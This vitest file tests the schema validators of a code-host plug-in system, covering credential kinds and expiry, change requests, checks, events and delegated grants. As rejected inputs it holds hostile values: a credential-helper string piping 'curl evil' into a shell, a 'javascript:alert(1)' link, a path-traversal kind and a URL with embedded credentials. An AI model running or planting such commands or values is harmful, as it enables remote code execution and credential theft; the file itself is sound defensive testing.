import { describe, expect, it } from "vitest";
import {
  ActingIdentityPolicySchema, AttributionSchema, ChangeRequestFeedbackSchema, ChangeRequestInputSchema, ChangeRequestStatusSchema, ChangeRequestUpdateSchema, CheckSchema,
  CheckStartRequestSchema, CheckTargetSchema, DELEGATED_GRANT_MAX_LIFETIME_MS, GIT_CREDENTIAL_HELPERS, GIT_CREDENTIAL_MAX_LIFETIME_MS, workerGitCredentialUsable, CodeHostCapabilitiesSchema, CodeHostEventSchema, CODE_HOST_EVENT_TYPES, DelegatedGrantSchema, GitCredentialSchema,
  HostScopeSchema, MergeResultSchema, PluginKindSchema, TrackerEventSchema, TrackerItemSchema, actingIdentityModeAllowed, delegatedUseAllowed,
} from "../../packages/contracts/src/plugins/index.js";

const ref = { repository: { url: "https://git.example.test/acme/app" }, id: "7", url: "https://git.example.test/acme/app/pull/7" };
const sha = "a".repeat(40);
const hex64 = "b".repeat(64);

describe("plug-in kinds and scopes", () => {
  it.each(["github", "fake", "code-commit", "x1"])("accepts the kind %s", (kind) => expect(PluginKindSchema.safeParse(kind).success).toBe(true));
  it.each(["", "GitHub", "has space", "1abc", "a".repeat(33), "../x", "git_hub"])("refuses the kind %j", (kind) => expect(PluginKindSchema.safeParse(kind).success).toBe(false));

  it("takes an org scope or a named system scope and nothing else", () => {
    expect(HostScopeSchema.safeParse({ system: "webhook" }).success).toBe(true);
    expect(HostScopeSchema.safeParse({ system: "anything" }).success).toBe(false);
    expect(HostScopeSchema.safeParse({}).success).toBe(false);
    expect(HostScopeSchema.safeParse({ system: "webhook", orgId: "x" }).success).toBe(false);
  });
});

describe("code host capabilities", () => {
  const caps = { drafts: true, threadedComments: true, requiredApprovals: true, codeOwners: true, webhooks: true, rerunChecks: false, perPersonCredentials: false, merge: true, markReady: true, requestReviewers: true, credentialKinds: ["token"] };
  it("accepts a full set", () => expect(CodeHostCapabilitiesSchema.parse(caps)).toEqual(caps));
  it("refuses a missing capability, an extra one and an empty credential list", () => {
    const missing: Record<string, unknown> = { ...caps };
    delete missing.drafts;
    expect(CodeHostCapabilitiesSchema.safeParse(missing).success).toBe(false);
    expect(CodeHostCapabilitiesSchema.safeParse({ ...caps, extra: true }).success).toBe(false);
    expect(CodeHostCapabilitiesSchema.safeParse({ ...caps, credentialKinds: [] }).success).toBe(false);
    expect(CodeHostCapabilitiesSchema.safeParse({ ...caps, credentialKinds: ["password"] }).success).toBe(false);
  });
});

describe("git credentials", () => {
  const NOW = Date.parse("2026-10-30T10:00:00.000Z");
  // P8: an ssh key credential carries the key, the ssh:// address and the pinned host keys (never trusting the first server that answers).
const SSH_KEY = { privateKey: "-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END OPENSSH PRIVATE KEY-----\n", sshUrl: "ssh://git@git.example.test/srv/app.git", knownHosts: `git.example.test ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI${"A".repeat(43)}` };
const soon = new Date(NOW + 30 * 60_000).toISOString();
  it("takes each of the four kinds with its own fields and an expiry", () => {
    expect(GitCredentialSchema.safeParse({ kind: "token", token: "t", expiresAt: soon }).success).toBe(true);
    expect(GitCredentialSchema.safeParse({ kind: "basic", username: "u", password: "p", expiresAt: soon }).success).toBe(true);
    expect(GitCredentialSchema.safeParse({ kind: "ssh-key", ...SSH_KEY, expiresAt: soon }).success).toBe(true);
    expect(GitCredentialSchema.safeParse({ kind: "helper", helper: "aws-codecommit", expiresAt: soon }).success).toBe(true);
  });
  it("refuses a credential with no expiry, whatever its kind", () => {
    for (const credential of [{ kind: "token", token: "t" }, { kind: "basic", username: "u", password: "p" }, { kind: "ssh-key", ...SSH_KEY }, { kind: "helper", helper: "aws-codecommit" }]) {
      expect(GitCredentialSchema.safeParse(credential).success, credential.kind).toBe(false);
      expect(workerGitCredentialUsable(credential, { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "invalid" });
    }
    expect(GitCredentialSchema.safeParse({ kind: "token", token: "t", expiresAt: "not a time" }).success).toBe(false);
  });
  it("refuses a kind with another kind's field, an empty secret and an unknown kind", () => {
    expect(GitCredentialSchema.safeParse({ kind: "token", password: "p", expiresAt: soon }).success).toBe(false);
    expect(GitCredentialSchema.safeParse({ kind: "token", token: "", expiresAt: soon }).success).toBe(false);
    expect(GitCredentialSchema.safeParse({ kind: "cookie", token: "t", expiresAt: soon }).success).toBe(false);
  });
  it("takes a helper by name from a fixed list and never a command", () => {
    expect([...GIT_CREDENTIAL_HELPERS]).toEqual(["aws-codecommit"]);
    for (const helper of ["!sh -c 'curl evil | sh'", "!aws codecommit credential-helper $@", "store", "/usr/bin/helper", ""]) {
      expect(GitCredentialSchema.safeParse({ kind: "helper", helper, expiresAt: soon }).success, helper).toBe(false);
    }
  });
  it("hands a worker only a credential that is not expired and not more than an hour out", () => {
    const token = (expiresAt: string) => ({ kind: "token", token: "t", expiresAt });
    expect(workerGitCredentialUsable(token(soon), { now: NOW, actingAs: "service" })).toMatchObject({ ok: true });
    expect(workerGitCredentialUsable(token(new Date(NOW).toISOString()), { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "expired" });
    expect(workerGitCredentialUsable(token(new Date(NOW - 1).toISOString()), { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "expired" });
    expect(workerGitCredentialUsable(token(new Date(NOW + GIT_CREDENTIAL_MAX_LIFETIME_MS).toISOString()), { now: NOW, actingAs: "service" })).toMatchObject({ ok: true });
    expect(workerGitCredentialUsable(token(new Date(NOW + GIT_CREDENTIAL_MAX_LIFETIME_MS + 1).toISOString()), { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "too_long_lived" });
    expect(workerGitCredentialUsable({ kind: "basic", username: "u", password: "p", expiresAt: new Date(NOW + 365 * 86_400_000).toISOString() }, { now: NOW, actingAs: "service" })).toEqual({ ok: false, reason: "too_long_lived" });
  });
  it("lets an ssh key go to a worker only for a service identity", () => {
    const key = { kind: "ssh-key", ...SSH_KEY, expiresAt: soon };
    expect(workerGitCredentialUsable(key, { now: NOW, actingAs: "service" })).toMatchObject({ ok: true });
    expect(workerGitCredentialUsable(key, { now: NOW, actingAs: "on-behalf-of" })).toEqual({ ok: false, reason: "ssh_key_needs_service_identity" });
  });
});

describe("change requests", () => {
  it("accepts an input and refuses an empty title, a missing branch and unknown fields", () => {
    const input = { repository: { url: "https://git.example.test/acme/app" }, sourceBranch: "rovara/x", targetBranch: "main", title: "Fix" };
    expect(ChangeRequestInputSchema.safeParse(input).success).toBe(true);
    expect(ChangeRequestInputSchema.safeParse({ ...input, title: "" }).success).toBe(false);
    expect(ChangeRequestInputSchema.safeParse({ ...input, sourceBranch: "" }).success).toBe(false);
    expect(ChangeRequestInputSchema.safeParse({ ...input, sourceBranch: "a\u0007b" }).success).toBe(false);
    expect(ChangeRequestInputSchema.safeParse({ ...input, sneaky: 1 }).success).toBe(false);
  });

  it("refuses a link that is not https or carries credentials", () => {
    expect(ChangeRequestUpdateSchema.safeParse({}).success).toBe(false);
    expect(ChangeRequestUpdateSchema.safeParse({ state: "merged" }).success).toBe(false);
    expect(ChangeRequestUpdateSchema.safeParse({ title: "x", state: "closed" }).success).toBe(true);
    const base = { name: "ci", state: "pending", required: true };
    expect(CheckSchema.safeParse({ ...base, url: "http://x.test/1" }).success).toBe(false);
    expect(CheckSchema.safeParse({ ...base, url: "https://user:pw@x.test/1" }).success).toBe(false);
    expect(CheckSchema.safeParse({ ...base, url: "javascript:alert(1)" }).success).toBe(false);
    expect(CheckSchema.safeParse({ ...base, url: "" }).success).toBe(true);
  });

  it("never reads a finished check without a conclusion as a pass, nor a pending one with a conclusion", () => {
    const base = { name: "ci", required: false, url: "" };
    expect(CheckSchema.safeParse({ ...base, state: "completed" }).success).toBe(false);
    expect(CheckSchema.safeParse({ ...base, state: "completed", conclusion: "success" }).success).toBe(true);
    expect(CheckSchema.safeParse({ ...base, state: "pending", conclusion: "success" }).success).toBe(false);
    expect(CheckSchema.safeParse({ ...base, state: "completed", conclusion: "great" }).success).toBe(false);
  });

  it("parses a status with checks, required checks and reviews", () => {
    const status = {
      id: "7", state: "open", draft: false, headRevision: sha, targetBranch: "main", mergeableState: "clean", mergeable: true,
      checks: [{ name: "ci", state: "completed", conclusion: "success", required: true, url: "" }], requiredChecks: [{ name: "ci" }], targetHasRequiredChecks: true,
      headDefinesChecks: true, requestedReviewers: 0,
      reviews: [{ reviewer: { login: "pat" }, accountType: "User", state: "APPROVED", revision: sha, submittedAt: "2026-10-30T00:00:00Z" }],
    };
    expect(ChangeRequestStatusSchema.parse(status)).toEqual(status);
    expect(ChangeRequestStatusSchema.safeParse({ ...status, mergeableState: "fine" }).success).toBe(false);
    expect(ChangeRequestStatusSchema.safeParse({ ...status, reviews: [{ ...status.reviews[0], state: "LGTM" }] }).success).toBe(false);
  });

  it("parses feedback with a head tree and refuses one without", () => {
    const details = { ref, state: "open", sourceBranch: "b", targetBranch: "main", headRevision: sha, title: "t", body: "" };
    const feedback = { changeRequest: { ...details, headTreeRevision: sha }, comments: [{ id: "1", kind: "discussion", url: "", author: "pat", updatedAt: "2026-10-30T00:00:00Z", body: "hi" }], threads: [] };
    expect(ChangeRequestFeedbackSchema.safeParse(feedback).success).toBe(true);
    expect(ChangeRequestFeedbackSchema.safeParse({ ...feedback, changeRequest: details }).success).toBe(false);
  });

  it("types a merge result by outcome with fixed refusal reasons", () => {
    expect(MergeResultSchema.safeParse({ outcome: "merged", method: "squash", fellBack: false }).success).toBe(true);
    expect(MergeResultSchema.safeParse({ outcome: "already_merged" }).success).toBe(true);
    expect(MergeResultSchema.safeParse({ outcome: "refused", reason: "head_changed" }).success).toBe(true);
    expect(MergeResultSchema.safeParse({ outcome: "refused", reason: "because" }).success).toBe(false);
    expect(MergeResultSchema.safeParse({ outcome: "refused", reason: "closed", hostMessage: "x".repeat(201) }).success).toBe(false);
  });
});

describe("neutral events", () => {
  const base = { eventId: "d-1", host: "github" };
  it("covers the neutral event types of the design, and each parses", () => {
    expect([...CODE_HOST_EVENT_TYPES].sort()).toEqual(["change_request.closed", "change_request.merged", "change_request.opened", "change_request.updated", "check.completed", "comment.created", "review.submitted", "revision.pushed"]);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "change_request.opened", ref }).success).toBe(true);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "review.submitted", ref, state: "APPROVED" }).success).toBe(true);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "comment.created", ref, commentId: "9" }).success).toBe(true);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "check.completed", repository: ref.repository, revision: sha, name: "ci", conclusion: "failure" }).success).toBe(true);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "revision.pushed", repository: ref.repository, branch: "main", revision: sha }).success).toBe(true);
  });
  it("refuses an event with no delivery id, an unknown type or a field it does not know", () => {
    expect(CodeHostEventSchema.safeParse({ host: "github", type: "change_request.opened", ref }).success).toBe(false);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "repository.deleted", ref }).success).toBe(false);
    expect(CodeHostEventSchema.safeParse({ ...base, type: "change_request.opened", ref, payload: {} }).success).toBe(false);
  });
});

describe("check runners and trackers", () => {
  it("takes a target by change request, revision or known run, and refuses a start with no idempotency key", () => {
    expect(CheckTargetSchema.safeParse({ kind: "change-request", ref }).success).toBe(true);
    expect(CheckTargetSchema.safeParse({ kind: "revision", repository: ref.repository, revision: sha }).success).toBe(true);
    expect(CheckTargetSchema.safeParse({ kind: "run", repository: ref.repository, revision: sha, run: { runner: "codebuild", id: "b:1" }, gate: "unit" }).success).toBe(true);
    expect(CheckTargetSchema.safeParse({ kind: "branch", name: "main" }).success).toBe(false);
    const start = { repository: ref.repository, revision: sha, gate: "unit", project: "p", timeoutMinutes: 20, idempotencyKey: "k" };
    expect(CheckStartRequestSchema.safeParse(start).success).toBe(true);
    expect(CheckStartRequestSchema.safeParse({ ...start, idempotencyKey: undefined }).success).toBe(false);
    expect(CheckStartRequestSchema.safeParse({ ...start, timeoutMinutes: 0 }).success).toBe(false);
  });

  it("parses a tracker item and the two events that can start a task", () => {
    const item = { ref: { tracker: "linear", id: "ENG-1" }, title: "t", body: "b", status: "open", labels: ["rovara"] };
    expect(TrackerItemSchema.safeParse(item).success).toBe(true);
    expect(TrackerItemSchema.safeParse({ ...item, status: "blocked" }).success).toBe(false);
    const base = { eventId: "e1", tracker: "linear", item: item.ref };
    expect(TrackerEventSchema.safeParse({ ...base, type: "item.assigned_to_rovara" }).success).toBe(true);
    expect(TrackerEventSchema.safeParse({ ...base, type: "item.labelled", label: "rovara" }).success).toBe(true);
    expect(TrackerEventSchema.safeParse({ ...base, type: "item.labelled" }).success).toBe(false);
    expect(TrackerEventSchema.safeParse({ ...base, type: "item.commented" }).success).toBe(false);
  });
});

describe("acting identity", () => {
  it("defaults nothing by itself but accepts only the two modes", () => {
    expect(ActingIdentityPolicySchema.safeParse({ plugin: "github", mode: "service" }).success).toBe(true);
    expect(ActingIdentityPolicySchema.safeParse({ plugin: "github", mode: "on-behalf-of" }).success).toBe(true);
    expect(ActingIdentityPolicySchema.safeParse({ plugin: "github", mode: "password" }).success).toBe(false);
  });

  it("offers on-behalf-of only where the host offers delegation", () => {
    expect(actingIdentityModeAllowed({ service: true, delegation: false }, "on-behalf-of")).toEqual({ ok: false, reason: "plugin_has_no_delegation" });
    expect(actingIdentityModeAllowed({ service: true, delegation: true }, "on-behalf-of")).toEqual({ ok: true, mode: "on-behalf-of" });
    expect(actingIdentityModeAllowed({ service: false, delegation: true }, "service")).toEqual({ ok: false, reason: "plugin_cannot_act_as_service" });
    expect(actingIdentityModeAllowed({ service: true, delegation: true }, "long-lived-cookie")).toEqual({ ok: false, reason: "mode_not_offered" });
  });

  it("names who asked and who approved in an attribution", () => {
    const attribution = { requestedBy: { name: "Priya", personId: hex64 }, approvedBy: { name: "Sam", personId: hex64 }, taskId: "task-1" };
    expect(AttributionSchema.safeParse(attribution).success).toBe(true);
    expect(AttributionSchema.safeParse({ ...attribution, requestedBy: { name: "Priya", personId: "short" } }).success).toBe(false);
    expect(AttributionSchema.safeParse({ approvedBy: attribution.approvedBy, taskId: "t" }).success).toBe(false);
  });

  const DAY = 3_600_000;
  const grantOf = (overrides: Record<string, unknown> = {}) => DelegatedGrantSchema.parse({ plugin: "ghes", taskId: "t1", grantedBy: hex64, purpose: "task-write", issuedAt: 1_000, expiresAt: 1_000 + DAY / 2, hostExpiresAt: 1_000 + DAY, ...overrides });

  it("lets a delegated credential serve only its own task's writes, at its own plug-in, for the person who started or approved it, before it expires", () => {
    const grant = grantOf();
    const approver = "e".repeat(64);
    const use = { plugin: "ghes", taskId: "t1", purpose: "task-write", now: 2_000, requestedBy: hex64, approvedBy: approver };
    expect(delegatedUseAllowed(grant, use)).toEqual({ ok: true });
    expect(delegatedUseAllowed(grant, { ...use, purpose: "approve" })).toEqual({ ok: false, reason: "not_a_task_write" });
    expect(delegatedUseAllowed(grant, { ...use, purpose: "merge" })).toEqual({ ok: false, reason: "not_a_task_write" });
    expect(delegatedUseAllowed(grant, { ...use, taskId: "t2" })).toEqual({ ok: false, reason: "other_task" });
    expect(delegatedUseAllowed(grant, { ...use, plugin: "github" })).toEqual({ ok: false, reason: "other_plugin" });
    expect(delegatedUseAllowed(grant, { ...use, now: grant.expiresAt })).toEqual({ ok: false, reason: "expired" });
    expect(delegatedUseAllowed(grant, { ...use, now: Number.NaN })).toEqual({ ok: false, reason: "expired" });
  });

  it("never serves a task the person who granted it did not start or approve", () => {
    const grant = grantOf();
    const use = { plugin: "ghes", taskId: "t1", purpose: "task-write", now: 2_000 };
    const other = "f".repeat(64);
    expect(delegatedUseAllowed(grant, { ...use, requestedBy: other })).toEqual({ ok: false, reason: "not_granted_by_a_task_person" });
    expect(delegatedUseAllowed(grant, { ...use, requestedBy: other, approvedBy: other })).toEqual({ ok: false, reason: "not_granted_by_a_task_person" });
    expect(delegatedUseAllowed(grant, { ...use, requestedBy: other, approvedBy: hex64 })).toEqual({ ok: true });
  });

  it("caps a grant at an hour, ties it to the person who granted it, and does not let it outlive the host's credential", () => {
    expect(DelegatedGrantSchema.safeParse({ plugin: "ghes", taskId: "t1", purpose: "task-write", issuedAt: 1_000, expiresAt: 2_000, hostExpiresAt: 3_000 }).success).toBe(false);
    expect(() => grantOf({ expiresAt: 1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS + 1, hostExpiresAt: 1_000 + 2 * DAY })).toThrow();
    expect(grantOf({ expiresAt: 1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS, hostExpiresAt: 1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS }).expiresAt).toBe(1_000 + DELEGATED_GRANT_MAX_LIFETIME_MS);
    expect(() => grantOf({ expiresAt: 5_000, hostExpiresAt: 4_000 })).toThrow();
    expect(() => grantOf({ expiresAt: 1_000 })).toThrow();
    expect(() => grantOf({ purpose: "approve" })).toThrow();
    expect(() => grantOf({ grantedBy: "short" })).toThrow();
  });
});
